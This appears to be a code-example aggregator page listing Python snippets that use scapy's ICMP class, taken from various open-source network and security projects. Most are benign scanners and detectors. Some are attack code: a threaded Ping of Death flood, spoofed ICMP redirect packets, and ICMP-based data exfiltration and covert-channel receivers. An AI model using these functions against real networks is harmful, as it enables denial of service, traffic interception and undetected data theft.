@@ -1,0 +1,444 @@
+示例1: detect_inactive_hosts
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def detect_inactive_hosts(scan_hosts):
+    """ 
+    Scans the network to find scan_hosts are live or dead
+    scan_hosts can be like 10.0.2.2-4 to cover range. 
+    See Scapy docs for specifying targets.   
+    """
+    global scheduler
+    scheduler.enter(RUN_FREQUENCY, 1, detect_inactive_hosts, (scan_hosts, ))
+    inactive_hosts = []
+    try:
+        ans, unans = sr(IP(dst=scan_hosts)/ICMP(), retry=0, timeout=1)
+        ans.summary(lambda r : r.sprintf("%IP.src% is alive"))
+        for inactive in unans:
+            print ("%s is inactive" %inactive.dst)
+            inactive_hosts.append(inactive.dst)
+        
+        print ("Total %d hosts are inactive" %(len(inactive_hosts)))
+             
+        
+    except KeyboardInterrupt:
+        exit(0) 
+开发者ID:PacktPublishing，项目名称:Python-Network-Programming-Cookbook-Second-Edition，代码行数:23，代码来源:3_7_detect_inactive_machines.py
+
+
+
+ 
+示例2: ping
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def ping(test_params, show_result=False):
+        """Check whether QUIC server is responding."""
+        if not test_params:
+            return None
+
+        ping_packets = [QUIC_PING_000, QUIC_PING_001]
+        for ping_packet in ping_packets:
+            ping_data = ping_packet.decode("hex")
+
+            response = udp_sr1(test_params, ping_data)
+            if not response:
+                continue
+            if ICMP in response and response[ICMP].type == 3:
+                print_verbose(test_params, "Received ICMP dest-unreachable")
+                continue
+            if 50 < len(response) < 70 or 1000 < len(response) < 2000:
+                return True
+            else:
+                print ("Received unknown message len: {}".format(len(response)))
+            # parsed_response = scrap_response(test_params, response)
+            # if check_dtls_response(test_params, parsed_response):
+            #     return True
+        return False 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:25，代码来源:quic_utils.py
+
+
+示例3: ping
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def ping(test_params, show_result=False):
+
+        ping_packets = [QUIC_PING_000, QUIC_PING_001]
+
+        for ping_packet in ping_packets:
+            ping_data = ping_packet.decode("hex")
+
+            response = udp_sr1(test_params, ping_data)
+            if not response:
+                continue
+            if ICMP in response and response[ICMP].type == 3:
+                print_verbose(test_params, "Received ICMP dest-unreachable")
+                continue
+            if 50 < len(response) < 70 or 1000 < len(response) < 2000:
+                return True
+            else:
+                print ("Received unknown message len: {}".format(len(response)))
+            # parsed_response = scrap_response(test_params, response)
+            # if check_dtls_response(test_params, parsed_response):
+            #     return True
+        return False 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:23，代码来源:quic_tester.py
+
+
+
+ 
+示例4: POD_ATTACK
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def POD_ATTACK(threads, attack_time, target):
+    # Finish
+    global FINISH
+    FINISH = False
+
+    target_ip = target
+
+    print("\033[1;34m"+"[*]"+"\033[0m"+" Starting POD attack...")
+    
+    threads_list = []
+
+    # POD flood
+    def pod_flood():
+        global FINISH
+        payload = random.choice(list("1234567890qwertyuiopasdfghjklzxcvbnm")) * 60000
+        packet  = IP(dst = target_ip) / ICMP(id = 65535, seq = 65535) / payload
+
+        while not FINISH:
+            for i in range(16):
+                send(packet, verbose = False)
+                print("\033[1;32m"+"[+]"+"\033[0m"+" Packet was sent!")
+
+    # Start threads
+    for thread in range(0, threads):
+        print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
+        t = Thread(target = pod_flood)
+        t.start()
+        threads_list.append(t)
+    # Sleep selected secounds
+    time.sleep(attack_time)
+    # Terminate threads
+    for thread in threads_list:
+        FINISH = True
+        thread.join()
+    
+    print("\033[1;77m"+"[i]"+"\033[0m"+" Attack completed.") 
+开发者ID:entynetproject，项目名称:quack，代码行数:38，代码来源:pod.py
+
+
+示例5: pkt_callback
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def pkt_callback(self, pkt):
+        """
+        Process PING packets
+        """
+        if pkt[ICMP].type == 8:
+            if pkt[IP].id >= 200 and pkt[IP].id < 300:
+                self.pktlen = pkt[IP].id - 200
+            elif pkt[IP].id >= 300 and pkt[IP].id < 400:
+                self.pkttotal = pkt[IP].id - 300
+            elif pkt[IP].id >= 500 and pkt[IP].id < 600:
+                self.dic[pkt[IP].id - 500] = '{:04x}'.format(pkt[ICMP].seq)
+            elif pkt[IP].id == 666:
+                if DEBUG:
+                    print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
+                          + 'PING:' + pkt[IP].src + ':ALARM Case Open!')
+
+        if len(self.dic) == self.pkttotal:
+            odic = collections.OrderedDict(sorted(self.dic.items()))
+            final = ''
+            for value in odic.iteritems():
+                final = final + value[1]
+            text = decrypt(final[:self.pktlen])
+            text = text.strip()
+            hexip = text.split(',')[-1]
+            text = text.replace(hexip, hextoip(hexip))
+            text = 'PING:' + pkt[IP].src + ':' + text
+            printer(self.filed, text)
+            self.dic = {}
+            self.pkttotal = 200 
+开发者ID:ekiojp，项目名称:circo，代码行数:31，代码来源:carpa.py
+
+
+
+ 
+示例6: build_icmp
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def build_icmp(self):
+        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=self.ip_address) /\
+              IP(src=self.target, dst=self.gateway)/UDP()
+
+        return pkt 
+开发者ID:paranoidninja，项目名称:piSociEty，代码行数:7，代码来源:ICMP.py
+
+
+示例7: detect
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def detect(self, dst_port):
+        pkt = IP(dst=self._target) / ICMP(type=ICMP_ECHO_REQUEST, code=0x41)
+        response = sr1(pkt, verbose=False, timeout=CFG_PACKET_TIMEOUT)
+
+        if response is None:
+            self.ipnet_score = 0
+        elif response['ICMP'].code == 0:
+            self.ipnet_score = 20
+        else:
+            self.ipnet_score = -20 
+开发者ID:ArmisSecurity，项目名称:urgent11-detector，代码行数:12，代码来源:urgent11_detector.py
+
+
+示例8: generator
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def generator(self, n, filename):
+
+        time = 0.00114108 * n + 0.157758
+        minutes = time/60
+
+        print('Generating packets, it will take %s seconds, moreless (%s, minutes)' % (time, minutes))
+
+        pkgs = [IP(dst='10.0.0.1')/ICMP() for i in range(n)]
+        wrpcap(filename, pkgs)
+
+        print('%s packets generated.' % (n)) 
+开发者ID:ffmancera，项目名称:pentesting-multitool，代码行数:13，代码来源:flooder_utility.py
+
+
+示例9: send
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def send(data):
+    data = base64.b64encode(data)
+    app_exfiltrate.log_message(
+        'info', "[icmp] Sending {} bytes with ICMP packet".format(len(data)))
+    scapy.sendp(scapy.Ether() /
+                scapy.IP(dst=config['target']) / scapy.ICMP() / data, verbose=0) 
+开发者ID:sensepost，项目名称:DET，代码行数:8，代码来源:icmp.py
+
+
+示例10: listen
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def listen():
+    app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
+    # Filter for echo requests only to prevent capturing generated replies
+    scapy.sniff(filter="icmp and icmp[0]=8", prn=analyze) 
+开发者ID:sensepost，项目名称:DET，代码行数:6，代码来源:icmp.py
+
+
+示例11: analyze
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def analyze(packet):
+    src = packet.payload.src
+    dst = packet.payload.dst
+    try:
+        app_exfiltrate.log_message(
+            'info', "[icmp] Received ICMP packet from: {0} to {1}".format(src, dst))
+        app_exfiltrate.retrieve_data(base64.b64decode(packet.load))
+    except:
+        pass 
+开发者ID:sensepost，项目名称:DET，代码行数:11，代码来源:icmp.py
+
+
+示例12: traceroute_discovery
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def traceroute_discovery(self):
+        config = get_config()
+        node_internal_ip = srp1(
+            Ether() / IP(dst="1.1.1.1", ttl=1) / ICMP(), verbose=0, timeout=config.network_timeout,
+        )[IP].src
+        return [[node_internal_ip, "24"]]
+
+    # querying azure's interface metadata api | works only from a pod 
+开发者ID:aquasecurity，项目名称:kube-hunter，代码行数:10，代码来源:hosts.py
+
+
+示例13: get_cbr0_ip_mac
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def get_cbr0_ip_mac(self):
+        config = get_config()
+        res = srp1(Ether() / IP(dst="1.1.1.1", ttl=1) / ICMP(), verbose=0, timeout=config.network_timeout)
+        return res[IP].src, res.src 
+开发者ID:aquasecurity，项目名称:kube-hunter，代码行数:6，代码来源:dns.py
+
+
+示例14: execute
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def execute(self):
+        config = get_config()
+        logger.debug("Attempting to get kube-dns pod ip")
+        self_ip = sr1(IP(dst="1.1.1.1", ttl=1) / ICMP(), verbose=0, timeout=config.netork_timeout)[IP].dst
+        cbr0_ip, cbr0_mac = self.get_cbr0_ip_mac()
+
+        kubedns = self.get_kube_dns_ip_mac()
+        if kubedns:
+            kubedns_ip, kubedns_mac = kubedns
+            logger.debug(f"ip={self_ip} kubednsip={kubedns_ip} cbr0ip={cbr0_ip}")
+            if kubedns_mac != cbr0_mac:
+                # if self pod in the same subnet as kube-dns pod
+                self.publish_event(PossibleDnsSpoofing(kubedns_pod_ip=kubedns_ip))
+        else:
+            logger.debug("Could not get kubedns identity") 
+开发者ID:aquasecurity，项目名称:kube-hunter，代码行数:17，代码来源:dns.py
+
+
+示例15: execute
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def execute(self):
+        config = get_config()
+        self_ip = sr1(IP(dst="1.1.1.1", ttl=1) / ICMP(), verbose=0, timeout=config.network_timeout)[IP].dst
+        arp_responses, _ = srp(
+            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=f"{self_ip}/24"), timeout=config.network_timeout, verbose=0,
+        )
+
+        # arp enabled on cluster and more than one pod on node
+        if len(arp_responses) > 1:
+            # L3 plugin not installed
+            if not self.detect_l3_on_host(arp_responses):
+                self.publish_event(PossibleArpSpoofing()) 
+开发者ID:aquasecurity，项目名称:kube-hunter，代码行数:14，代码来源:arp.py
+
+
+示例16: cmd_icmp_ping
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def cmd_icmp_ping(ip, interface, count, timeout, wait, verbose):
+    """The classic ping tool that send ICMP echo requests.
+
+    \b
+    # habu.icmp.ping 8.8.8.8
+    IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+    IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+    IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+    IP / ICMP 8.8.8.8 > 192.168.0.5 echo-reply 0 / Padding
+    """
+
+    if interface:
+        conf.iface = interface
+
+    conf.verb = False
+    conf.L3socket=L3RawSocket
+
+    layer3 = IP()
+    layer3.dst = ip
+    layer3.tos = 0
+    layer3.id = 1
+    layer3.flags = 0
+    layer3.frag = 0
+    layer3.ttl = 64
+    layer3.proto = 1 # icmp
+
+    layer4 = ICMP()
+    layer4.type = 8 # echo-request
+    layer4.code = 0
+    layer4.id = 0
+    layer4.seq = 0
+
+    pkt = layer3 / layer4
+
+    counter = 0
+
+    while True:
+        ans = sr1(pkt, timeout=timeout)
+        if ans:
+            if verbose:
+                ans.show()
+            else:
+                print(ans.summary())
+            del(ans)
+        else:
+            print('Timeout')
+
+        counter += 1
+
+        if count != 0 and counter == count:
+            break
+
+        sleep(wait)
+
+    return True 
+开发者ID:fportantier，项目名称:habu，代码行数:57，代码来源:cmd_icmp_ping.py
+
+
+示例17: cmd_gateway_find
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import ICMP [as 别名]
+def cmd_gateway_find(network, iface, host, tcp, dport, timeout, verbose):
+    """
+    Try to reach an external IP using any host has a router.
+
+    Useful to find routers in your network.
+
+    First, uses arping to detect alive hosts and obtain MAC addresses.
+
+    Later, create a network packet and put each MAC address as destination.
+
+    Last, print the devices that forwarded correctly the packets.
+
+    Example:
+
+    \b
+    # habu.find.gateway 192.168.0.0/24
+    192.168.0.1 a4:08:f5:19:17:a4 Sagemcom
+    192.168.0.7 b0:98:2b:5d:22:70 Sagemcom
+    192.168.0.8 b0:98:2b:5d:1f:e8 Sagemcom
+    """
+
+    if verbose:
+        logging.basicConfig(level=logging.INFO, format='%(message)s')
+
+    conf.verb = False
+
+    if iface:
+        iface = search_iface(iface)
+        if iface:
+            conf.iface = iface['name']
+        else:
+            logging.error('Interface {} not found. Use habu.interfaces to show valid network interfaces'.format(iface))
+            return False
+
+    res, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2)
+
+    neighbors = set()
+
+    for _, pkt in res:
+        neighbors.add((pkt['Ether'].src, pkt['Ether'].psrc))
+
+    for mac,ip in neighbors:
+        if tcp:
+            res, unans = srp(Ether(dst=mac)/IP(dst=host)/TCP(dport=dport), timeout=timeout)
+        else:
+            res, unans = srp(Ether(dst=mac)/IP(dst=host)/ICMP(), timeout=timeout)
+        for _,pkt in res:
+            if pkt:
+                if verbose:
+                    print(pkt.show())
+                else:
+                    print(ip, mac, conf.manufdb._get_manuf(mac)) 
+开发者ID:fportantier，项目名称:habu，代码行数:54，代码来源:cmd_gateway_find.py
